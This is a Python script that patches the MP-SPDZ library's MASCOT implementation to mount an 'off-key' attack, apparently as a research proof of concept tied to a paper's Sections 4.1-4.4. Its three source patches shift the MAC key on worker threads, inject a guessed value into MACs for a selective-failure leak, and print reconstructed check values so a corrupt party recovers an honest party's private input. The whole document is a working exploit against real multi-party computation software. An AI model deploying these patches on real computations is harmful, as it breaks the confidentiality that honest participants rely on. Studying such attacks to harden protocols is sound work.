#!/usr/bin/env python3
"""Patches for the off-key attack on MP-SPDZ MASCOT.

Three patches, all applied only to the attacker's binary:

1. Machine.hpp: increment alphapi between thread inits, so the worker thread
   generates preprocessing under key alpha+1 while the main thread (which takes
   the inputs) uses alpha. This is the off-key preprocessing that both attack
   variants rely on.

2. Processor.hpp (muls): on a worker thread, add ATTACK_GUESS to the MAC of the
   honest party's multiplication input. This drives the *selective-failure*
   variant (Sections 4.1-4.3): the worker's MAC check passes iff the guess is
   right, so pass/abort leaks one bit. With ATTACK_GUESS unset or 0 this patch
   is a no-op, which is what the recovery variant uses.

3. MAC_Check.hpp (Check): on the attacked worker thread, print the reconstructed
   per-opening check value. MP-SPDZ's default MAC check is the *unmasked*
   Damgard et al. (2013) check: every party commits to and opens its own share
   delta_i = v * alpha_i - m_{v,i}, so the attacker learns the sum
   sum_i delta_i = v * alpha - m_v for each opened value v. Under the off-key
   setup, the honest input y enters a masked opening d = y - b whose
   reconstructed check value is exactly y - g (g defaults to 0). This realizes
   the *stronger* attack of Section 4.4: the attacker recovers y outright in a
   single run, even though the check then aborts and the opened output is 0.
"""

import sys

# Patch 1: Machine.hpp
with open("Processor/Machine.hpp", "r") as f:
    code = f.read()

old = """  for (int i = old_n_threads; i < nthreads; i++)
    {
      queues[i] = new ThreadQueue;
      // stand-in for initialization
      queues[i]->schedule({});
      tinfo[i].thread_num=i;
      tinfo[i].Nms=&N;
      tinfo[i].alphapi=&alphapi;
      tinfo[i].alpha2i=&alpha2i;
      tinfo[i].machine=this;
      pthread_t thread;
      int res = pthread_create(&thread, NULL,
          thread_info<sint, sgf2n>::Main_Func, &tinfo[i]);

      if (res == 0)
        threads.push_back(thread);
      else
        throw runtime_error("cannot start thread");
    }

  assert(queues.size() == threads.size());

  // synchronize with clients before starting timer
  for (int i=old_n_threads; i<nthreads; i++)
    {
      queues[i]->result();
    }"""

new = """  bool do_attack = (getenv("ATTACK_MAC_KEY") != nullptr)
                   and (nthreads > 1) and (old_n_threads == 0);
  for (int i = old_n_threads; i < nthreads; i++)
    {
      queues[i] = new ThreadQueue;
      queues[i]->schedule({});
      tinfo[i].thread_num=i;
      tinfo[i].Nms=&N;
      tinfo[i].alphapi=&alphapi;
      tinfo[i].alpha2i=&alpha2i;
      tinfo[i].machine=this;
      pthread_t thread;
      int res = pthread_create(&thread, NULL,
          thread_info<sint, sgf2n>::Main_Func, &tinfo[i]);
      if (res == 0)
        threads.push_back(thread);
      else
        throw runtime_error("cannot start thread");
      if (do_attack and i == old_n_threads)
        {
          queues[i]->result();
          alphapi += 1;
        }
    }
  assert(queues.size() == threads.size());
  for (int i=old_n_threads; i<nthreads; i++)
    {
      if (do_attack and i == old_n_threads) continue;
      queues[i]->result();
    }"""

assert old in code, "Machine.hpp patch target not found"
code = code.replace(old, new)
if "<cstdlib>" not in code:
    code = '#include <cstdlib>\n' + code
with open("Processor/Machine.hpp", "w") as f:
    f.write(code)
print("Patched Machine.hpp")


# Patch 2: Processor.hpp — modify muls() to add guess to MACs on worker threads
with open("Processor/Processor.hpp", "r") as f:
    code = f.read()

old = """template<class T>
void SubProcessor<T>::muls(const vector<int>& reg)
{
    assert(reg.size() % 4 == 0);

    SubProcessor<T>& proc = *this;
    protocol.init_mul();"""

new = """template<class T>
void SubProcessor<T>::muls(const vector<int>& reg)
{
    assert(reg.size() % 4 == 0);

    // ATTACK: on worker threads, add guess to MAC of multiplication inputs
    const char* gs = getenv("ATTACK_GUESS");
    if (gs and P.my_num() == 0
        and BaseMachine::has_singleton()
        and BaseMachine::s().thread_num > 0)
      {
        long g = atol(gs);
        if (g != 0)
          for (auto it = reg.begin(); it < reg.end(); it += 4)
            for (int j = 0; j < *it; j++)
              {
                // Only modify the SECOND operand (index 3 = y)
                // The first operand (index 2 = x) is the attacker's own input
                auto& share = S[*(it + 3) + j];
                auto mac = share.get_mac();
                mac += g;
                share = T(share.get_share(), mac);
              }
      }

    SubProcessor<T>& proc = *this;
    protocol.init_mul();"""

assert old in code, "Processor.hpp muls patch target not found"
code = code.replace(old, new)
with open("Processor/Processor.hpp", "w") as f:
    f.write(code)
print("Patched Processor.hpp (muls)")


# Patch 3: MAC_Check.hpp — on the attacked worker thread, print the
# reconstructed per-opening check value (Section 4.4 input recovery).
with open("Protocols/MAC_Check.hpp", "r") as f:
    code = f.read()

# Make BaseMachine (for thread_num) visible in this compilation context.
if "Processor/BaseMachine.h" not in code:
    code = code.replace(
        '#include "Protocols/MAC_Check.h"',
        '#include "Protocols/MAC_Check.h"\n#include "Processor/BaseMachine.h"',
        1,
    )

old = """      for (auto& delta : deltas)
        {
          for (auto& os : bundle)
            if (&os != &bundle.mine)
              delta += os.get<typename U::mac_type>();
          if (delta != 0)
            mac_fail_remove<U>(P);
        }"""

new = """      // ATTACK (Section 4.4): the unmasked check opens each party's delta_i,
      // so the attacker learns sum_i delta_i = v*alpha - m_v for every opening.
      // On the off-key worker thread this equals y - g on the tapped opening
      // d = y - b, recovering the honest input before the abort.
      bool atk_recover = (getenv("ATTACK_MAC_KEY") != nullptr)
          and (P.my_num() == 0) and (BaseMachine::thread_num > 0);
      long atk_guess = getenv("ATTACK_GUESS") ? atol(getenv("ATTACK_GUESS")) : 0;
      int atk_idx = 0;
      for (auto& delta : deltas)
        {
          for (auto& os : bundle)
            if (&os != &bundle.mine)
              delta += os.get<typename U::mac_type>();
          if (atk_recover)
            {
              typename U::mac_type rec = delta;
              rec += atk_guess;
              cerr << "ATTACK_RECOVERED opening=" << atk_idx
                   << " value=" << rec << endl;
            }
          if (delta != 0)
            mac_fail_remove<U>(P);
          atk_idx++;
        }"""

assert old in code, "MAC_Check.hpp Check patch target not found"
code = code.replace(old, new)
with open("Protocols/MAC_Check.hpp", "w") as f:
    f.write(code)
print("Patched MAC_Check.hpp (unmasked-check recovery)")
